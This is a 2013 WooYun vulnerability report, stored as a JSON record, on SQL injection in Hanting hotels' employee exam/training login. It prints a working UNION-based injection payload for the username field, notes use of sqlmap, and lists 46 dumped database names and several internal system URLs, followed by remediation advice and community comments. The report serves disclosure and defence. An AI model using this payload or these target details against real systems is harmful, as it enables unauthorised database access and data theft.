{"id": 12904, "wybug_id": "wooyun-2013-020735", "wybug_title": "汉庭某系统注射注射出几个系统", "wybug_corp": "汉庭酒店", "wybug_author": "小胖子", "wybug_date": "2013-03-27 02:45", "wybug_open_date": "2013-05-11 02:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "后台被猜解", "管理后台对外", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-11：\t细节向公众公开  简要描述： 听说汉庭有免房卡？ 详细说明：  这下可牵扯出大的了。千里之堤毁于注入，注入地点：http://training.htinns.com/exam2/  汉庭考试系统？员工还考试的？很明显的是有些系统也被波及了，比如上一级目录就是OA系统！http://training.htinns.com/注入点，登录框注射，参数，username。随手输入'or'登录，就报错，还不是小报错。\n\n然后呢Payload: username=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(120)+CHAR(58)+CHAR(119)+CHAR(75)+CHAR(100)+CHAR(90)+CHAR(89)+CHAR(66)+CHAR(103)+CHAR(110)+CHAR(79)+CHAR(120)+CHAR(58)+CHAR(110)+CHAR(98)+CHAR(117)+CHAR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &password=1&czbz=1在然后呢？丢到sqlmap去看看。\n\n跑出数据库一看，不看不知道，一看吓一跳。\navailable databases [46]:[*] Application_Registry_Service_DB[*] Bdc_Service_DB[*] dbcenter[*] Decision[*] eCell6[*] Exam1[*] HTFranchisee[*] HtinnsAdviser[*] HTScore[*] InnInspection[*] InspectionAudit[*] Managed Metadata Service[*] master[*] model[*] msdb[*] OA[*] PerformancePoint Service Application[*] PnCheck[*] PurchaseSurvey[*] RCTIDB[*] ReportServer[*] ReportServerTempDB[*] ROOMCHK[*] Search_Service_Application_CrawlStoreDB[*] Search_Service_Application_DB[*] Search_Service_Application_PropertyStoreDB[*] Secure_Store_Service_DB[*] SharePoint_AdminContent[*] SharePoint_Config[*] slam[*] StateService[*] tempdb[*] test[*] User Profile Service Application_ProfileDB[*] User Profile Service Application_SocialDB[*] User Profile Service Application_SyncDB[*] USERPLUS[*] VHArchives_HanTing[*] WebAnalyticsService_ReportingDB[*] WebAnalyticsService_StagingDB[*] WordAutomationServices[*] WSS_Content[*] WSS_Content_90[*] WSS_Content[*] WSS_Logging[*] YunYing\n46个数据库，仔细一看，还有另外几个大系统的库。比如：OA系统：http://training.htinns.com/网上报销系统：http://hters.htinns.com运营系统：http://yunying.htinns.com/  数据库YunYing，可惜只能盲注，好慢好慢。投资决策系统：http://jcxt.htinns.com/都是重要系统，本屌丝不敢乱来，赶紧报送，望速修复。   漏洞证明：  见详细说明。   修复方案：  1：注入没什么好说的，过滤过滤再过滤。2：数据库账户降权。3：礼物和rank是不是要给力一点？乌云自有颜如玉，也要汉庭大床房！   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-27 13:25 厂商回复： 感谢漏洞提交，已转交相关小组进行跟进，该漏洞其他同学已提交过，不过还是给个15分。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-27 08:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  好像有看见过那传说中的卡    \n     2013-03-27 08:51 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @wefgod @小胖子 等你确认有了再说...    \n     2013-03-27 09:36 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @leaf 我咋没有呢，哈。    \n     2013-03-27 09:41 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @专业种田 洞主现身说法，那看来真没有...    \n     2013-03-27 09:58 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  @专业种田 @leaf @wefgod   貌似看到zone有人分享还是微博上有人分享，汉庭的免房卡。    \n     2013-03-27 10:04 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @小胖子 在微博上看到的吧。    \n     2013-03-30 15:38 |    \t\t爹 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:4        | 想...想活捉一枚处男...ing...)\t\t \n  太贱了 。。。。房卡都不放过    \n     2013-07-05 00:37 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @汉庭酒店 这个还没有修复    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}